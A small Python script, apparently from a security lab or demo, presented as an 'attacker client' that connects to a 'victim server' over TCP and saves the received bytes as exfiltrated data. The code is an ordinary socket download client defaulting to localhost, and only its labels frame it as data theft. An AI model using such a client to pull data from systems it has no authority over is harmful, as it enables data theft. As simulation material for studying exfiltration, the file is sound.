import argparse
import socket
import os
import time

HOST = "127.0.0.1"
PORT = 9000

ROOT = os.path.dirname(__file__)
DATA_DIR = os.path.join(ROOT, 'data')
OUT_FILE = os.path.join(DATA_DIR, 'exfiltrated_by_attacker.enc')


def run_client(host=HOST, port=PORT, out_path=OUT_FILE):
    with socket.create_connection((host, port), timeout=10) as s:
        print(f"[attacker] Connected to {host}:{port}")
        chunks = []
        while True:
            data = s.recv(4096)
            if not data:
                break
            chunks.append(data)
        content = b"".join(chunks)
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, 'wb') as f:
            f.write(content)
        print(f"[attacker] Saved {len(content)} bytes to {out_path}")


def main(argv=None):
    parser = argparse.ArgumentParser(description='Run attacker client to fetch encrypted sensitive file from victim server.')
    parser.add_argument('host', nargs='?', default=HOST, help='Victim server IP or hostname')
    parser.add_argument('--port', default=PORT, type=int, help='Victim server port')
    parser.add_argument('--output', default=OUT_FILE, help='Output file path for exfiltrated data')
    args = parser.parse_args(argv)
    run_client(host=args.host, port=args.port, out_path=args.output)


if __name__ == '__main__':
    main()
